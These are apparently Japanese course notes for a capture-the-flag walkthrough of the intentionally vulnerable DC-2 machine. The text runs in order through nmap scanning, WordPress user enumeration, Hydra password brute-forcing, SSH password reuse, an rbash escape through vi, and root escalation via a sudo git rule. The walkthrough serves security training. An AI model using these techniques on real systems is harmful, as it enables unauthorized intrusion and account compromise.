# EXPERIMENT #03 DC-2 のハッキング

## [実習] DC-2 マシンをハッキングする＜攻略＞

### 1. DC-2 マシン(ターゲット端末)を起動

DC-2 を headless で動かす場合

```sh
# virtual machineの名前を確認
$ VBoxManage list vms
> "DC-2" {f0dcd342-e14f-40bb-baa0-abfc55ca1daf}
```

```sh
# virtual machineをheadlessで起動
$ VBoxManage startvm DC-2 --type headless
```

### 2. ParrotOS(攻撃端末)を起動

ParrotOS を起動する， 講師と同じようにしたい場合は ParrotOS の sshd を起動させておく

### 3. ParrotOS の IP アドレスを確認する

IP アドレスとデバイス名を特定する

```sh
parrot01$ ip -4 address show

> enp0s8 # デバイス名
> inet 192.168.56.101/24 # IPアドレス
```

### 4. DC-2 マシンの IP アドレスを特定する(netdiscover, fping)

ターゲット端末の IP の特定は方法が様々ある，環境に応じて使い分ける

netdiscover(p347)

```sh
parrot01$ sudo netdiscover -i enp0s8 -r 192.168.56.0/24
```

fping(p412)

```sh
parrot01$ fping -aqg 192.168.56.0/24

> 192.168.56.1      # host
> 192.168.56.100 # dhcp
> 192.168.56.101  # parrot01
> 192.168.56.103 # dc-2
```

### 5. IP アドレスを環境変数に設定する

上記で特定した IP を環境変数$IP に設定

```sh
parrot01$ export IP=192.168.56.103
```

### 6. 実験用ディレクトリを作成

後でパスワードクラッキング用のファイルや環境を用いるためディレクトリを作成し，その中で作業を行う

```sh
parrot01$ mkdir -p ~/vulnhub/dc-2 && cd $_
```

### 7. ポートスキャンする(nmap)

ターゲット端末の情報を nmap で収集する

nmap(p412)

```sh
parrot01$ nmap -sC -sV $IP --open -p-
```

- sC ディフォルトスキャン
- sV ソフトウェア名とヴァージョン
- p ポート番号，p- ですべてのポート番号

このパターンはよく使うので`alias portscan='nmap -sC -sV --open -p- '` を Alias 定義しておき`$ portscan $IP` として使うと良い

### 8. HTTP アクセ ス 9. curl コマンドでリダイレクトページを扱う

HTTP のポートが空いているのでブラウザ(できれば Burp)を用いてアクセスしてみる
リダイレクトや名前ベースの Web サーバなので Host ヘッダが必要である，教科書では
hosts ファイルに記述することによって解決しているが，その仕組みを curl を使って説明する

- [netcat](./netcat.md)
- [curl](./curl.md)

```sh
parrot01$ curl $IP        # 応答なし
```

```sh
# I(大文字のアイ)オプションで Responce Header をみる
parrot01$ curl -I $IP

> HTTP/1.1 301 Moved Permanently
> Date: Thu, 23 Jan 2025 08:39:24 GMT
> Server: Apache/2.4.10 (Debian)
> Location: http://dc-2/
> Content-Type: text/html; charset=UTF-8
```

```sh
# L オプションで Redirect 先に飛んで見る
parrot01$ curl -L $IP
> Could not resolve host: dc-2
```

```sh
# Redirect 先の Header をみる, 名前解決が出来ていない
parrot01$ curl -LI $IP

> HTTP/1.1 301 Moved Permanently #status code 301
> Date: Thu, 23 Jan 2025 08:47:47 GMT
> Server: Apache/2.4.10 (Debian)
> Location: http://dc-2/
> Content-Type: text/html; charset=UTF-8

> curl: (6) Could not resolve host: dc-2
```

```sh
# HオプションでHostHeaderを付与する
parrot01$ curl -IH "Host: dc-2" $IP

> HTTP/1.1 200 OK # status code 200 OK
> Date: Thu, 23 Jan 2025 08:50:24 GMT
> Server: Apache/2.4.10 (Debian)
> Link: <http://dc-2/index.php/wp-json/>; rel="https://api.w.org/"
> Link: <http://dc-2/>; rel=shortlink
>Content-Type: text/html; charset=UTF-8
```

```sh
# ページが表示される
parrot01$ curl -H "Host: dc-2" $IP
```

```sh
# hosts ファイルに追記
parrot01$ sudo sh -c "echo dc-2 $IP >> /etc/hosts" # hosts ファイルに追記
```

```sh
# 名前解決ができるようになったので，IP ではなく名前でリクエストしてみる
parrot01$ curl http://dc-2 # ページが表示される
```

burp のリクエストヘッダー

```burp
GET / HTTP/1.1
Host: dc-2 #HostHeader
Accept-Language: ja
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: wp-settings-time-2=1737613301
Connection: keep-alive
```

### 10. Web サイトを探索

curl は標準出力をつかうため，パイプやリダイレクトを使って他の UNIX コマンドを連携を取ることができる，grep や sed, tr など正規表現を用いると強力である

```sh
# flag という文字を大文字小文字を無視して検索
parrot01$ curl -H 'Host:dc-2' $IP | grep -i 'flag'`
```

```sh
# grepで見つかったURIにアクセス
parrot01$ curl http://dc-2/index.php/flag/
```

```sh
# html2text で文章だけ抜き出す (sudo apt install html2text)
$ curl http://dc-2/index.php/flag/ | html2text -utf8

> ****** Flag ******
> Flag 1:
> Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
> More passwords is always better, but sometimes you just can’t win them all.
> Log in as one to see the next flag.
> If you can’t find it, log in as another.
```

### 11. URI を環境変数に設定する

```sh
parrot01$ export URL="http://$IP:80"
parrot01$ curl $URI # 確認
```

### 12. アクセスできるファイルを列挙(gobuster)

Gobuster(p357)を使用して，Web 内のファイルやディレクトリを調査する

```sh
parrot01$ gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt
> ディレクトリやファイルの一覧が取得できる

parrot01$ curl $URL/wp-admin/ # 取得したディレクトリにアクセスしてみる
```

Gobuster

- dir # directory
- u URL # URL を指定
- w FILE # 辞書ファイルを指定

### 13. 情報収集を継続する(wig)

[wig](https://github.com/kyc/wig) を用いてより情報を得て見る，ヴァージョン情報や Login ページの情報が取得できている

```sh
parrot01$ wig $URL
```

### 14. ユーザーを列挙する

wordpress では，$URI/?author=USER_ID => $/URI/index.php/author/USERNAME
に転送されるのでリダイレクト先の URI から USERNAME を推測できる。
また feed からも USERNAME を推測できる

```sh
# ResponceHeaderからリダイレクト先を入手
parrot01$ curl -I $URI/?author=1

> HTTP/1.1 301 Moved Permanently
> Date: Fri, 24 Jan 2025 01:12:45 GMT
> Server: Apache/2.4.10 (Debian)
> Location: http://dc-2/index.php/author/admin/
> Content-Type: text/html; charset=UTF-8
```

Location ヘッダーに情報があるので，それを取得する

```sh
parrot01$ curl -s -I $URI/?author=[1-5] | grep 'Location'

> Location: http://dc-2/index.php/author/admin/
> Location: http://dc-2/index.php/author/jerry/
```

```sh
#feedからユーザー名を取得する
parrot01$ curl -s $URI/?author=[1-5] | grep '\/author\/'

> <link rel="alternate" type="application/rss+xml" title="DC-2 &raquo; Posts by Tom Cat Feed" href="http://dc-2/index.php/author/tom/feed/" />
```

上記の作業を nmap に[スクリプト](https://svn.nmap.org/nmap/scripts/http-wordpress-users.nse)をつかって行ってみる

```sh
parrot01$ nmap -p80 --script http-wordpress-users $IP
```

上記情報からユーザーリストを作る

```sh
parrot01$ echo -e "admin\njerry\ntom" > users.txt
```

### 15. 辞書ファイルを生成(CeWL)

[CeWL](https://github.com/digninja/CeWL)を用いて辞書ファイルを生成する

```sh
parrot01$ git clone https://github.com/diginja/CeWL && cd $_
parrot01$ sudo gem install bundler
parrot01$ chmod u+x ./cewl.rb  # 実行権限を付与
parrot01$ ./cewl.rb dc-2               # プログラムを確認
parrot01$ ./cewl.rb dc-2 -w ../cewl.txt # ファイルに書き込み
parrot01$ head ../cewl.txt            # 書き込まれたか確認
parrot01$ cd ../                                 # 辞書ファイルをおいたディレクトリに移動
```

16. WordPress の認証を解読する(hydra)

ユーザーファイルをパスワードの辞書ファイルが出来たので[Hydra]()を用いてオンラインでのパスワードクラックを行う

```sh
parrot01$ hydra -L users.txt -P cewl.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location

> login: jerry password: adipiscing
> login: tom password: parturient
```

- hydra
- L ユーザー名のリストファイル
- P パスワードファイル
- dc2 (ホストアドレス)
- http-form-post /wp-login.php (wp-login.php ページに Post する)
  - log=^USER^ (form の log の value に users.txt を適応)
  - pwd=^PASS^ (form の pwd の value に cewl.txt を適応)
  - wp-submit=Log In (form の wp-submit の value に' Log In' を代入)
  - testcookie=1:S=Location (testcookie に 1:S=Location を適応)

```html
<form name="loginform" id="loginform" <!-- action="http://dc-2/wp-login.php" -->
  <!-- method="post"> Post Method -->
  <p>
    <label for="user_login"
      >Username or Email Address<br />
      <input type="text" <!-- name="log" -- />
      id="user_login" class="input"
      <!-- value="jerry" -->
      size="20" /></label
    >
  </p>
  <p>
    <label for="user_pass"
      >Password<br />
      <input type="password" <!-- name="pwd" -- />
      id="user_pass" class="input"
      <!-- value="adipiscing" -->
      size="20" /></label
    >
  </p>
  <p class="forgetmenot">
    <label for="rememberme"
      ><input
        name="rememberme"
        type="checkbox"
        id="rememberme"
        value="forever"
      />
      Remember Me</label
    >
  </p>
  <p class="submit">
    <input type="submit" <!-- name="wp-submit" -- />
    id="wp-submit" class="button button-primary button-large"
    <!-- value="Log In" -->
    />
    <input type="hidden" <!-- name="redirect_to" -- />
    <!-- value="http://dc-2/wp-admin/" -->
    <input type="hidden" <!-- name="testcookie" -- />
    <!-- value="1" -->
    />
  </p>
</form>
```

Burp で上記ページに適当なユーザー名とパスワード(今回は jerry/adipiscing)でアクセスして Post リクエストがどうなっているか確認してみる

```txt
POST /wp-login.php HTTP/1.1
Host: dc-2
Content-Length: 89
Cache-Control: max-age=0
Accept-Language: ja
Origin: http://dc-2
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dc-2/wp-login.php
Accept-Encoding: gzip, deflate, br
Cookie: wp-settings-time-2=1737613301; wordpress_test_cookie=WP+Cookie+check
Connection: keep-alive

log=jerry&pwd=adipiscing&wp-submit=Log+In&redirect_to=http%3A%2F%2Fdc-2%2Fwp-admin%2F&testcookie=1
```

### 17. WordPress のダッシュボードにアクセスする

Burp を使い jerry や tom としてログインして調査する

### 18. SSH アクセスする

nmap で ssh が 7744 ポートで稼働していたことを確認したので，ssh login を試みる。
wordpress の user/password と OS の user/password は別物であるが，パスワードの使い回しを試みる

```sh
# tom でログインできた
parrot01$ ssh  tom@$IP -p 7744
> password: parturient
```

### 19 tom ユーザーで実行できるコマンドを調べる

tom ユーザのシェルは rbash なので機能制限がかかっているので使えるコマンドは
./usr/bin ディレクトリの less, ls, scp, less のシンボリックリンクのみ

```sh
# ディレクトリの一覧
tom@DC-2:~$ ls -R .

> .:
> flag3.txt  usr
>
> ./usr:
> bin
>
> ./usr/bin:
> less  ls  scp  vi
```

```sh
# 環境変数を一覧表示する
tom@DC-2:~$ export -p

> declair -x HOME="/home/tom"
...
```

```sh
# flag3.txt の中身を表示
tom@DC-2:~$ less ./flag3.txt

> Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

### 20 基本コマンドを実行できる環境を目指す

vi の機能をつかって rbash を乗り換えるが，その前に vi の基本機能を確認しておく
UNIX のコマンドには他の UNIX コマンドを連携を取るために，コマンド内でシェルや他のコマンドを呼び出すことができる機能を持つものがある(less, man, vi など)。
コマンドの前に`!をつけて他のコマンド 呼び出したり eg: `!ls /`また`shell` と入力することで shell を呼び出すことができる，なお vi では ex モードにて行う。また vi は set option で shell を変更することができる

```vi
: set all                        # vi のすべてのoptionをみる
: set shell                   # rbash 現在設定されているshell オプション
: set shell=/bin/sh  # shell を 変更
: shell                          # shellの呼び出し
tom@DC-2:~ $ echo $0    # 現在のshellの確認
```

環境変数 PATH に path を追加する，su コマンドが /bin もしくは/usr/bin にあることがわかっておれば /usr/bin だけを追加すれば良いしフルパスで呼び出すなら設定しなくても良い

```sh
# PATHを追加する
tom@DC-2:~ $ echo $PATH # 現在のPATHの内容
export PATH: $PATH:/usr/bin:/bin:/usr/sbin:/sbin
```

### 21 su コマンドで別のユーザーに切り替える

bash が使えるようになったので，flag3 ファイルのヒント jerry への `su` を試してみる

```sh
# jerry userにスイッチする
tom@DC-2:~ $ su - jerry
> password: adipiscing
# ユーザーを確認 whoami や echo $USERを使っても良い
jerry@DC-2:~$ id -a
> uid=1002(jerry) gid=1002(jerry) groups=1002(jerry)
```

```sh
jerry@DC-2:~$ ls
> flag4.txt
jerry@DC-2:~$ cat flag4.txt
> Good to see that you've made it this far - but you're not home yet.
> You still need to get the final flag (the only flag that really counts!!!).
> No hints here - you're on your own now.  :-)
> Go on - git outta here!!!!
```

Go on - git outta here!!!! だそうだ

### 22 sudo コマンドの設定を調べる

[Potato のハッキング](./experiment01.md) で学んだ `sudo -l` (p274) をつかって
jerry に付与されてる管理者権限を確認し，それを使って特権昇格を狙う

```sh
jerry@DC-2:~$ sudo -l
> User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

flag4.txt でほのめかしていた git がパスワードなしで使えるようだ，こんな設定は現実にはありえないが...

### 23 git コマンドを利用してシェルをうばう(Privilege escalation)

[git help](https://gtfobins.github.io/gtfobins/git)

```sh
jerry@DC-2:~$ sudo git -p  help config
> !/bin/bash
# rootになれた
root@DC-2:/home/jerry# id
> uid=0(root) gid=0(root) groups=0(root)
```

```sh
# root の Home ディレクトリに移動
root@DC-2:/home/jerry# cd && pwd
> /root

root@DC-2: ~# ls
> final-flag.txt

root@DC-2: ~# cat final-flag.txt
> Congratulatons!!!
>
> A special thanks to all those who sent me tweets
> and provided me with feedback - it's all greatly
> appreciated.

> If you enjoyed this CTF, send me a tweet via @DCAU7.
```
